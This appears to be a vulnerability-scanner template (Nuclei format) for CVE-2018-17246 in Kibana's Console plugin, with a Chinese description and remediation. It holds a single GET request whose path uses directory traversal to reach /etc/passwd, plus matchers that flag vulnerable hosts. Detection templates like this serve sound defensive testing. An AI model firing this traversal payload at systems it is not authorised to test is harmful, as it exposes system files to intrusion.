id: CVE-2018-17246
info:
  name: Kibana - Local File Inclusion
  author:
  - l0ne1y
  description: |-
    Elasticsearch Kibana 本地文件包含漏洞
    Elasticsearch Kibana（前称elasticsearch-dashboard）是荷兰Elasticsearch公司的一套开源的、基于浏览器的分析和搜索Elasticsearch仪表板工具。Console是其中的一个控制台插件。

    Elasticsearch Kibana 6.4.3之前版本和5.6.13之前版本中的Console插件存在安全漏洞。攻击者可通过发送请求利用该漏洞在主机操作系统上以Kibana进程权限执行任意命令。
  severity: critical
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://discuss.elastic.co/t/elastic-stack-6-4-3-and-5-6-13-security-update/155594

    临时修复方案：
    1、禁用Kibana控制台插件。可以通过在kibana.yml文件中设置“console.enabled: false”来禁用控制台插件。
requests:
- matchers:
  - type: word
    part: body
    words:
    - '"message":"An internal server error occurred"'
  - type: word
    condition: and
    part: header
    words:
    - kbn-name
    - application/json
    - kibana
  - type: status
    status:
    - 500
  matchers-condition: and
  path:
  - '{{BaseURL}}/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd'
  method: GET
